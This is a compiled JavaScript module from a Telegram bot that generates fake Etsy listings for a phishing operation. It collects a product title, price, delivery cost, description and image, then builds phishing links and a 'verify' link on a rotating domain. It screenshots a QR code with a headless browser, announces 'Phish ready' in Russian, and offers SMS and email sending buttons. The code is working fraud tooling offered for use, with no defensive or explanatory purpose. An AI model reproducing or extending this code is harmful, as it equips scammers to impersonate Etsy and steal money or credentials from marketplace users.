"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.scene = exports.composer = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const deleteAllMessages_1 = require("../../../helpers/deleteAllMessages");
const ads_1 = require("../../../database/models/ads");
const database_1 = require("../../../database");
const getPictureMenu_1 = require("../../../helpers/getPictureMenu");
const moment_1 = __importDefault(require("moment/moment"));
const getFlagEmoji_1 = require("../../../helpers/getFlagEmoji");
const console_1 = __importDefault(require("console"));
const { chromium } = require('playwright');
exports.composer = new grammy_1.Composer();
const regex = /^ad manual creation etsy (?<country>\w+)/gmi;
exports.composer.callbackQuery(regex, startScene);
async function startScene(ctx) {
    const data = /^ad manual creation etsy (?<country>\w+)/gmi.exec(ctx.callbackQuery.data);
    return ctx.scenes.enter('manualCreationAd-Etsy', {
        country: data.groups.country
    });
}
exports.scene = new grammy_scenes_1.Scene('manualCreationAd-Etsy');
async function cancel(ctx) {
    await (0, deleteAllMessages_1.deleteAllMessages)(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
}
exports.scene.always().callbackQuery('cancel manualCreationAd-Etsy', cancel);
exports.scene.do(async (ctx) => {
    ctx.session.createAdManual = {};
    ctx.session.deleteMessage = [];
    ctx.session.service = 'etsy';
    ctx.session.country = ctx.scene.opts.arg.country;
    const res = await ctx.reply(`<b>${(0, getFlagEmoji_1.getFlagEmoji)(ctx.session.country)} Введи название товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-Etsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.session.tgId = res.message_id;
    ctx.scene.resume();
});
exports.scene.wait().hears(/(^.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.title = ctx.message.text;
    const res = await ctx.reply(`<b>💶 Введи цену товара (только цифры):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-Etsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.scene.wait().hears(/(^.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.price = ctx.match[1];
    const res = await ctx.reply(`<b>🚚 Введи цену за доставку товара (только цифры):</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-Etsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.scene.wait().hears(/(^.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    let price = parseFloat(ctx.session.createAdManual.price);
    const deliveryPrice = parseFloat(ctx.match[1]);
    price += deliveryPrice;
    ctx.session.createAdManual.price = price.toFixed(2) + ' €';
    ctx.session.createAdManual.deliveryPrice = deliveryPrice.toFixed(2) + ' €';
    const res = await ctx.reply(`<b>💬 Введи описание товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-Etsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.scene.wait().hears(/(^.+)/, async (ctx) => {
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.description = ctx.msg.text;
    const res = await ctx.reply(`<b>🌌 Скинь изображение товара:</b>`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Отмена', callback_data: 'cancel manualCreationAd-Etsy' }]
            ]
        }
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.session.tgId = res.message_id;
    ctx.scene.resume();
});
exports.scene.wait().on('message:photo', async (ctx) => {
    const res = await ctx.getFile();
    ctx.session.deleteMessage.push(ctx.msg.message_id);
    ctx.session.createAdManual.img = res.file_path;
    ctx.scene.resume();
});
exports.scene.do(async (ctx) => {
    const domen = await database_1.domensRepository.findOneBy({ active: true, service: `etsy` });
    if (!domen)
        return ctx.reply('domen undefined error');
    const date = Date.now();
    const ad = new ads_1.Ads();
    ad.price = ctx.session.createAdManual.price;
    ad.title = ctx.session.createAdManual.title;
    ad.description = ctx.session.createAdManual.description;
    ad.img = ctx.session.createAdManual.img;
    ad.link = `2333383018-${date}`;
    ad.originallink = 'none';
    ad.deliveryPrice = ctx.session.createAdManual.deliveryPrice;
    ad.date = `${date}`;
    ad.country = ctx.session.country;
    ad.service = 'etsy';
    ad.author = ctx.user;
    ad.manualCreation = true;
    await database_1.adsRepository.save(ad);
    let msg = await ctx.reply('⏳ Создание qr...');
    try {
        const browser = await chromium.launch({
            args: ['--disable-dev-shm-usage', '--no-sandbox'],
        });
        const context = await browser.newContext();
        const page = await context.newPage();
        await page.goto(`https://${domen.link}/link/${ad.link}?qrcode=true`);
        await page.screenshot({ path: `temp/qrcode_${ad.date}.png` });
    }
    catch (e) {
        console_1.default.log(e);
    }
    try {
        await ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
    }
    catch (e) {
        console_1.default.log(e);
    }
    await ctx.replyWithPhoto(await (0, getPictureMenu_1.getPictureMenu)(ctx.user), {
        caption: `
Фиш готов 👌

🆔 ID: <code>${ad.date}</code>

📦 <b>Товар:</b> <code>${ad.title}</code>
💸 <b>Цена:</b> <code>${ad.price}</code>
💡 <b>Платформа: ETSY [${ctx.session.country.toUpperCase()} ${(0, getFlagEmoji_1.getFlagEmoji)(ctx.session.country)}]</b>
♻️ <b>Домен сменён ${(0, moment_1.default)(new Date(domen.dateChange)).fromNow()}</b>
➖➖➖➖➖➖➖
🌠 <b>Созданные ссылки:</b> 
<a href="https://${domen.link}/link/${ad.link}">LINK [2.0]</a> | <a href="https://${domen.link}/link/${ad.link}?verify=true">VERIFY [2.0]</a>
`.replace('\n', ''),
        reply_markup: await createKeyboard(ad.id, ctx.user)
    });
    ctx.scene.exit();
});
const createKeyboard = async (id, user) => {
    const keyb = new grammy_1.InlineKeyboard();
    // .text("🙊 Настройки", `settings ad ${id}`)
    keyb.row();
    keyb.text("📲 SMS", `sms etsy ${id}`);
    keyb.text("💌 EMAIL", `email etsy ${id}`);
    keyb.row();
    keyb.text("🎲 QR-code", `qrcode get ${id}`);
    keyb.text("⚙ Настройки", `settings ad ${id}`);
    keyb.row();
    keyb.text("Главное меню", `menuWithPicture`);
    return keyb;
};
